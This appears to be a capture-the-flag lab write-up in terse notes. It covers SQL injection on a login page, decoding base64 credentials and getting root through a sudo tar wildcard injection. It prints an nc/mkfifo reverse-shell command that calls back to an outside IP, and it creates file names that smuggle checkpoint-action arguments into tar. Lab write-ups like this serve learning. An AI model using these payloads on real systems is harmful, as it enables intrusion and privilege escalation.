nmap shows ports 22 ssh, 80 web, 9090 web open
initially, we dont find anything on port 80, so we move on and try to do things to port 9090
thought of bruteforce, wouldnt work
for sqli, there was a js running, which would strip special chars. so we try it with burp. NOPE!

HINT TAKEN : login.php on port 80 is vulnerable to sqli
`admin'or 1=1-- //` and so it was!
we are logged into a passwords manager admin panel, where there are 2 creds
|james|Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI=|
|cameron|dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy|
looks base64
once decoded, the creds are
```text
james : canttouchhhthiss@455152
camreon : thisscanttbetouchedd@455152
```
ssh dint work for neither, but port 9090 login worked for james
there was an endpoint, /terminal, which gave us an interractive enough shell as james

---
sudo -l showed we could run 
`(ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *`
cough, wildcard!

So, first create a file with the reverse shell there. a simple mkfifo should do.
```zsh
echo "mkfifo /tmp/f; nc 192.168.45.247 9090 < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f" > rshell.sh
#Now, create a file that seems like an argument of the tar command.
echo "" > "--checkpoint-action=exec=sh rshell.sh"
echo "" > --checkpoint=1
sudo /usr/bin/tar -czvf /tmp/backup.tar.gz *
```
root!
